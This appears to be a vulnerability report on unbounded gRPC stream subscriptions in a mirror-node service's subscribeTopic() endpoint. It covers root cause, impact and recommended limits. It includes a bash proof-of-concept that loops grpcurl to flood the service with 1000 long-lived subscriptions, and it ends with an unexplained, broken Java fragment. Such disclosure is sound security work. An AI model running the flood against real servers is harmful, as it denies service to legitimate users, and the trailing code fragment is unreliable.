### Title
Unbounded Multi-Connection Stream Exhaustion in `subscribeTopic()` Enables gRPC Service DoS

### Summary
`ConsensusController.subscribeTopic()` accepts any unauthenticated subscription with no per-IP or global connection count enforcement. The only guard — `maxConcurrentCallsPerConnection = 5` — is a **per-connection** HTTP/2 stream cap, not a global one. An attacker who opens many TCP connections (each carrying 5 streams) can create an unbounded number of concurrent reactive subscriptions, exhausting thread-pool, database, and memory resources and starving legitimate clients.

### Finding Description

**Exact code path:**

`subscribeTopic()` immediately creates a reactive pipeline for every caller with no admission check: [1](#0-0) 

The only server-level guard is applied in `GrpcConfiguration`: [2](#0-1) 

which reads from `NettyProperties`: [3](#0-2) 

**Root cause:** `NettyServerBuilder.maxConcurrentCallsPerConnection(5)` maps to the HTTP/2 `SETTINGS_MAX_CONCURRENT_STREAMS` frame and caps streams **per TCP connection**. It does not cap the total number of TCP connections, the total number of streams across all connections, or the number of connections from a single IP. There are no production `ServerInterceptor` implementations that perform rate-limiting or connection counting — the only interceptor in the repository is a test-only helper: [4](#0-3) 

The throttle infrastructure (bucket4j, `ThrottleManagerImpl`, `ThrottleConfiguration`) exists exclusively in the `web3` module and is never wired into the gRPC module: [5](#0-4) 

**Exploit flow:**
1. Attacker opens *C* TCP connections to port 5600 (default gRPC port).
2. On each connection the attacker opens 5 concurrent `subscribeTopic` streams (the per-connection maximum), each with `limit = 0` (unlimited) and a far-future `consensusEndTime`.
3. Total live subscriptions = *C × 5*. With *C = 1000*, that is 5 000 long-lived reactive pipelines, each backed by a Reactor subscriber chain, a shared-listener slot, and periodic database polling.
4. The server's `applicationTaskExecutor` thread pool and the database connection pool saturate; new connection attempts from legitimate clients either queue indefinitely or are rejected at the OS TCP backlog.

### Impact Explanation
Every `subscribeTopic` call allocates a `Disposable` reactive subscription that polls the database at the configured `listener.interval` (default 500 ms). With thousands of concurrent subscriptions the database connection pool (`hiero.mirror.grpc.db.*`) is exhausted, the shared listener's `maxBufferSize = 16384` buffer overflows sending errors to all subscribers, and the Netty I/O threads stall. Legitimate mirror-node clients (wallets, explorers, dApps) cannot subscribe to any topic. Severity is **High** for the mirror-node gRPC surface; it does not affect consensus-node operation but constitutes a complete denial of the mirror-node topic-subscription service.

### Likelihood Explanation
No authentication, no API key, and no IP allowlist is required. The attacker needs only a standard gRPC client (e.g., `grpcurl`, the Hedera Java SDK, or a raw HTTP/2 client). Opening thousands of TCP connections from a single host or a small botnet is trivial. The attack is repeatable: after a restart the attacker can immediately re-flood. The `maxConcurrentCallsPerConnection = 5` default is documented publicly in `docs/configuration.md` line 424, so the per-connection limit is known. [6](#0-5) 

### Recommendation
Apply layered mitigations in `GrpcConfiguration`:

1. **Global connection limit** — call `NettyServerBuilder.maxConnectionAge(Duration, TimeUnit)` and `NettyServerBuilder.maxConnectionIdle(Duration, TimeUnit)` to recycle long-lived connections and bound total connection count.
2. **Per-IP connection throttle** — add a production `@GlobalServerInterceptor` that tracks active-stream counts keyed by `call.getAttributes().get(Grpc.TRANSPORT_ATTR_REMOTE_ADDR)` and rejects with `Status.RESOURCE_EXHAUSTED` when a single IP exceeds a configurable threshold (e.g., 10 concurrent streams).
3. **Global stream cap** — maintain an `AtomicInteger` of total active subscriptions; reject new calls above a configurable ceiling.
4. **Expose the limit as a property** — add `maxConnectionsPerIp` and `maxTotalConnections` to `NettyProperties` alongside the existing `maxConcurrentCallsPerConnection`.

### Proof of Concept
```bash
# Requires grpcurl (https://github.com/fullstorydev/grpcurl)
# Open 200 connections × 5 streams = 1000 concurrent subscriptions from one host

for i in $(seq 1 200); do
  for j in $(seq 1 5); do
    grpcurl -plaintext \
      -d '{"topicID":{"topicNum":1},"consensusStartTime":{"seconds":0},"limit":0}' \
      -H "content-type: application/grpc" \
      <mirror-node-host>:5600 \
      com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
  done
done

# After ~1000 background processes are running, attempt a legitimate subscription:
grpcurl -plaintext \
  -d '{"topicID":{"topicNum":2},"consensusStartTime":{"seconds":0},"limit":1}' \
  <mirror-node-host>:5600 \
  com.hedera.mirror.api.proto.ConsensusService/subscribeTopic
# Expected result: hangs or returns UNAVAILABLE / RESOURCE_EXHAUSTED
```

@RequiredArgsConstructor

    public static final String RATE_LIMIT_BUCKET = "rateLimitBucket";
    public static final String OPCODE_RATE_LIMIT_BUCKET = "opcodeRateLimitBucket";

    private final ThrottleProperties throttleProperties;

    @Bean(name = RATE_LIMIT_BUCKET)
    Bucket rateLimitBucket() {
        long rateLimit = throttleProperties.getRequestsPerSecond();

                .capacity(rateLimit)
                .refillGreedy(rateLimit, Duration.ofSeconds(1))
                .build();
